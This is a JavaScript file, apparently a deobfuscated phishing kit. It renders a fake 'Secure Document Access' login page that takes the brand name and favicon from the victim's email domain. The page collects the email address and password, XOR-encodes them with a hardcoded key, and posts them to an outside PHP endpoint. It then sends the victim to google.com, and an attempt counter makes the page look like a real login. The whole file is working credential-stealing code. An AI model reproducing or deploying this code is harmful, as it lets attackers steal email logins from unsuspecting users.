(function () {
  "use strict";

  // Configuration - extracted from _0x374f98 in original
  const CONFIG = {
    BG_IMG: "https://images.unsplash.com/photo-1517849845537-4d257902454a?w=1920&q=80",
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    PHP_ENDPOINT: "http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php",
    SUCCESS_REDIRECT: "https://www.google.com",
    LOCKOUT_REDIRECT: "https://www.google.com",
    SECRET_KEY: "MATT_SECURE_2026",
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: "st_7b3f19",
    PATH_SEGMENTS: ["base", "node", "code_p4r7", "22sjwjknjqdq", "AjsjjsjsY"],
    MSG_WRONG: "Incorrect access code. Please try again.",
    MSG_LOCKOUT: "Too many attempts. Access temporarily locked.",
    MSG_GRANTED: "Access granted! Redirecting...",
    MSG_NET: "Network error. Please check connection.",
    HEADING: "Secure Document Access",
    SUBHEAD: "Enter credentials to view document",
    FOOTER: "Encrypted Document · © 2026",
    EMAIL_LABEL: "Email Address",
    KEY_LABEL: "Access Code",
    KEY_PLACEHOLDER: "Enter your access code",
    BUTTON_TEXT: "Verify & View Document",
    TAG_TEXT: "Secure"
  };

  // Encryption helper from _0x52b58a / _0x24d279
  function encryptData(data, key) {
    const jsonStr = JSON.stringify(data);
    const keyLen = key.length;
    let result = "";
    for (let i = 0; i < jsonStr.length; i++) {
      const charCode = jsonStr.charCodeAt(i) ^ key.charCodeAt(i % keyLen);
      result += ("0" + charCode.toString(16)).slice(-2);
    }
    return btoa(result);
  }

  // Get domain from email - from _0x66386b
  function getEmailDomain(email) {
    if (!email || email.indexOf("@") === -1) return "";
    const parts = email.split("@");
    if (parts.length === 2 && parts[0].trim() !== "") {
      return parts[1].trim().toLowerCase();
    }
    return "";
  }

  // Capitalize first letter - from _0x514502
  function capitalize(str) {
    if (!str) return "";
    return str.charAt(0).toUpperCase() + str.slice(1);
  }

  // Create background element - from _0x1a0432
  function createBackground() {
    const bg = document.createElement("div");
    bg.id = "bg_canvas";
    bg.className = "frame_v7";
    
    const overlay = document.createElement("div");
    overlay.id = "bg_veil";
    
    document.body.appendChild(bg);
    document.body.appendChild(overlay);
  }

  // Create main UI elements - from _0x8166d4
  function createUI() {
    const container = document.createElement("div");
    container.id = "base_node";
    container.className = "base_node";

    // Alert banner
    const alertDiv = document.createElement("div");
    alertDiv.id = "alert_banner";
    alertDiv.className = "alert_banner";
    document.body.appendChild(alertDiv);

    // Main form container
    const mainForm = document.createElement("div");
    mainForm.id = "main_form";
    mainForm.className = "card_root";
    
    // Brand orb with lock icon
    const brandRow = document.createElement("div");
    brandRow.className = "brand_row";
    brandRow.innerHTML = `
      <div class="brand_orb" id="brand_orb">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
      </div>
      <img src="" alt="brand_img" id="brand_img" style="display:none">
    `;
    
    // Title
    const title = document.createElement("h1");
    title.className = "title_main";
    title.id = "title_main";
    title.textContent = CONFIG.HEADING;
    
    // Subtitle
    const subTitle = document.createElement("div");
    subTitle.className = "caption_sub";
    subTitle.id = "caption_sub";
    subTitle.textContent = CONFIG.SUBHEAD;

    // Form
    const form = document.createElement("form");
    form.id = "form_auth";
    form.innerHTML = `
      <div class="field_shell">
        <label class="lbl_small" for="email_input">${CONFIG.EMAIL_LABEL}</label>
        <div class="inp_wrap">
          <input type="email" id="email_input" class="inp_core" placeholder="Enter your email" required autocomplete="off">
          <div class="ico_slot">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
              <polyline points="22,6 12,13 2,6"></polyline>
            </svg>
          </div>
        </div>
      </div>
      
      <div class="field_shell">
        <label class="lbl_small" for="code_input">${CONFIG.KEY_LABEL}</label>
        <div class="inp_wrap">
          <input type="password" id="code_input" class="inp_core" placeholder="${CONFIG.KEY_PLACEHOLDER}" required autocomplete="off">
          <button type="button" class="eye_btn" id="eye_toggle">
            <svg class="eye_show" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
            <svg class="eye_hide" style="display:none" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
              <line x1="1" y1="1" x2="23" y2="23"></line>
            </svg>
          </button>
        </div>
      </div>
      
      <button type="submit" class="cta_main" id="submit_btn">
        <span class="btn_text">${CONFIG.BUTTON_TEXT}</span>
        <span class="ring_loader" id="ring_loader"></span>
      </button>
    `;

    // Footer tag
    const footer = document.createElement("div");
    footer.className = "row_block";
    footer.innerHTML = `
      <div class="chip_tag" id="chip_tag">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
        ${CONFIG.TAG_TEXT}
      </div>
      <div class="caption_node">${CONFIG.FOOTER}</div>
    `;

    mainForm.appendChild(brandRow);
    mainForm.appendChild(title);
    mainForm.appendChild(subTitle);
    mainForm.appendChild(form);
    mainForm.appendChild(footer);
    document.body.appendChild(mainForm);
  }

  // Apply background styles - from _0x3ce607
  function applyBackgroundStyles() {
    const bg = document.getElementById("bg_canvas");
    const veil = document.getElementById("bg_veil");
    
    if (!bg || !veil) return;
    
    bg.style.backgroundImage = `url(${CONFIG.BG_IMG})`;
    bg.style.filter = `brightness(${CONFIG.BG_BRI}) contrast(${CONFIG.BG_CON}) saturate(${CONFIG.BG_SAT})`;
    
    if (CONFIG.BG_BLUR > 0) {
      bg.style.filter += ` blur(${CONFIG.BG_BLUR}px)`;
    }
    if (CONFIG.BG_GRAY) {
      bg.style.filter += " grayscale(1)";
    }
    
    veil.style.background = `rgba(10,66,123,${CONFIG.BG_OVERLAY})`;
  }

  // Update URL with random token - from _0x446451
  function updateURL() {
    try {
      const array = new Uint8Array(16);
      crypto.getRandomValues(array);
      const token = btoa(String.fromCharCode.apply(null, array))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
      history.replaceState(null, "", `#/${CONFIG.PATH_SEGMENTS.join("/")}/${token}`);
    } catch (e) {}
  }

  // Update favicon - from _0x32b3a6
  function updateFavicon(domain) {
    const img = new Image();
    const url = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
    
    img.onload = function() {
      const brandImg = document.getElementById("brand_img");
      if (brandImg) brandImg.src = url;
    };
    
    img.onerror = function() {
      const brandImg = document.getElementById("brand_img");
      if (brandImg) {
        brandImg.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='10' fill='%23464f5b'/%3E%3C/svg%3E";
      }
    };
    
    img.src = url;
  }

  // Show alert - from _0x36b61d
  function showAlert(message, type) {
    const alertBanner = document.getElementById("alert_banner");
    if (!alertBanner) return;
    
    alertBanner.textContent = message;
    alertBanner.className = "alert_banner visible " + type;
    
    if (type === "error") {
      alertBanner.style.background = "rgba(220,53,69,0.15)";
      alertBanner.style.color = "#ff6b6b";
      alertBanner.style.border = "1px solid rgba(220,53,69,0.3)";
    } else {
      alertBanner.style.background = "rgba(40,167,69,0.15)";
      alertBanner.style.color = "#51cf66";
      alertBanner.style.border = "1px solid rgba(40,167,69,0.3)";
    }
  }

  // Hide alert - from _0x381c63
  function hideAlert() {
    const alertBanner = document.getElementById("alert_banner");
    if (alertBanner) {
      alertBanner.classList.remove("visible");
    }
  }

  // Set loading state - from _0x148b5e
  function setLoading(isLoading) {
    const btn = document.getElementById("submit_btn");
    const loader = document.getElementById("ring_loader");
    
    if (btn) {
      btn.disabled = isLoading;
      btn.classList.toggle("locked_spin", isLoading);
    }
    if (loader) {
      loader.style.display = isLoading ? "inline-block" : "none";
    }
  }

  // Handle lockout - from _0x31d847
  function handleLockout() {
    const btn = document.getElementById("submit_btn");
    const codeInput = document.getElementById("code_input");
    
    showAlert(CONFIG.MSG_LOCKOUT, "error");
    setLoading(true);
    
    if (codeInput) codeInput.value = "";
    
    setTimeout(function() {
      window.location.href = CONFIG.LOCKOUT_REDIRECT;
    }, CONFIG.LOCKOUT_DELAY);
  }

  // Update email display - from _0x46696c
  function updateEmailDisplay() {
    const emailInput = document.getElementById("email_input");
    const titleMain = document.getElementById("title_main");
    const captionSub = document.getElementById("caption_sub");
    
    if (!emailInput) return;
    
    const email = emailInput.value.trim();
    const domain = getEmailDomain(email);
    
    if (!domain) {
      if (titleMain) titleMain.textContent = CONFIG.HEADING;
      if (captionSub) captionSub.textContent = CONFIG.SUBHEAD;
      updateFavicon("");
      return;
    }
    
    const domainName = capitalize(domain.split(".")[0]);
    if (titleMain) titleMain.textContent = domainName + " " + CONFIG.HEADING;
    if (captionSub) captionSub.textContent = domainName + " " + CONFIG.SUBHEAD;
    
    updateFavicon(domain);
  }

  // Form submission handler - from _0x41ee04
  function handleSubmit(e) {
    e.preventDefault();
    
    const emailInput = document.getElementById("email_input");
    const codeInput = document.getElementById("code_input");
    const submitBtn = document.getElementById("submit_btn");
    
    if (!emailInput || !codeInput) return;
    
    const email = emailInput.value.trim();
    const code = codeInput.value.trim();
    const startTime = Date.now();
    
    // Validation
    if (!email || email.indexOf("@") === -1) {
      showAlert("Please enter a valid email address.", "error");
      codeInput.focus();
      return;
    }
    
    if (!code) {
      showAlert("Please enter your access code.", "error");
      codeInput.focus();
      return;
    }
    
    hideAlert();
    setLoading(true);
    
    // Prepare payload - ORIGINAL: FormData with encrypted blob
    const formData = new FormData();
    const encryptedPayload = encryptData({ email: email, code: code }, CONFIG.SECRET_KEY);
    formData.append("data", encryptedPayload);
    
    // Fetch request
    fetch(CONFIG.PHP_ENDPOINT, {
      method: "POST",
      body: formData
    })
    .then(function(response) {
      return response.text();
    })
    .then(function(text) {
      let data = null;
      try {
        data = JSON.parse(text);
      } catch (e) {
        // Parse error
      }
      processResponse(data, email, code);
    })
    .catch(function() {
      setLoading(false);
      showAlert(CONFIG.MSG_NET, "error");
      codeInput.value = "";
      codeInput.focus();
    })
    .then(function() {
      // Minimum delay for UX
      const elapsed = Date.now() - startTime;
      const delay = Math.max(800, 2000 - elapsed);
      return new Promise(function(resolve) {
        setTimeout(resolve, delay);
      });
    })
    .then(function() {
      setLoading(false);
    });
  }

  // Process server response
  function processResponse(data, email, code) {
    const codeInput = document.getElementById("code_input");
    
    // Get attempt count
    let attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY + "_attempts") || "0", 10);
    attempts++;
    sessionStorage.setItem(CONFIG.STORAGE_KEY + "_attempts", String(attempts));
    
    if (!data) {
      if (attempts >= CONFIG.MAX_TRIES) {
        handleLockout();
        return;
      }
      showAlert(CONFIG.MSG_WRONG, "error");
      if (codeInput) {
        codeInput.value = "";
        codeInput.focus();
      }
      return;
    }
    
    // Handle response status
    if (data.status === "success") {
      showAlert(CONFIG.MSG_GRANTED, "success");
      sessionStorage.setItem(CONFIG.STORAGE_KEY + "_verified", "true");
      sessionStorage.setItem(CONFIG.STORAGE_KEY + "_email", email);
      setTimeout(function() {
        window.location.href = CONFIG.SUCCESS_REDIRECT;
      }, 1500);
    } else if (data.status === "locked") {
      handleLockout();
    } else {
      if (attempts >= CONFIG.MAX_TRIES) {
        handleLockout();
        return;
      }
      const remaining = CONFIG.MAX_TRIES - attempts;
      showAlert(CONFIG.MSG_WRONG + " (" + remaining + " attempts remaining)", "error");
      if (codeInput) {
        codeInput.value = "";
        codeInput.focus();
      }
    }
  }

  // Initialize - from _0x1ecf22
  function init() {
    // Check if already verified
    const verified = sessionStorage.getItem(CONFIG.STORAGE_KEY + "_verified");
    if (verified === "true") {
      window.location.href = CONFIG.SUCCESS_REDIRECT;
      return;
    }
    
    // Create UI
    createBackground();
    createUI();
    applyBackgroundStyles();
    updateURL();
    
    // Get DOM references
    const emailInput = document.getElementById("email_input");
    const codeInput = document.getElementById("code_input");
    const eyeToggle = document.getElementById("eye_toggle");
    const form = document.getElementById("form_auth");
    
    // Event listeners
    if (emailInput) {
      emailInput.addEventListener("input", updateEmailDisplay);
    }
    
    if (eyeToggle && codeInput) {
      eyeToggle.addEventListener("click", function() {
        const isPassword = codeInput.type === "password";
        codeInput.type = isPassword ? "text" : "password";
        
        const eyeShow = eyeToggle.querySelector(".eye_show");
        const eyeHide = eyeToggle.querySelector(".eye_hide");
        if (eyeShow) eyeShow.style.display = isPassword ? "none" : "block";
        if (eyeHide) eyeHide.style.display = isPassword ? "block" : "none";
        
        codeInput.focus();
      });
    }
    
    if (form) {
      form.addEventListener("submit", handleSubmit);
    }
    
    // Initial display
    updateEmailDisplay();
  }

  // Start
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
